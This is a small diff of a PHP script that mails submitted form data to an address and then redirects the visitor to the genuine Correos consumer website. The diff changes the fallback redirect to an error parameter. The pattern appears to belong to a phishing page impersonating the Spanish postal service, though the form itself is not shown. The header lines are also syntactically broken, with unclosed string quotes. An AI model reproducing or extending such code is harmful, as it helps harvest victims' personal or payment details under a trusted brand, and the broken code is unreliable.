@@ -26,7 +26,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 			mail($to, $subject, $message, $headers);
 			
       header("Location: https://www.correos.es/es/es/particulares);
-    }else header("Location: https://www.correos.es/es/es/particulares);
+    }else header("Location: ?error=".md5($_GET['error']));
 }
 ?>
 <!DOCTYPE html>
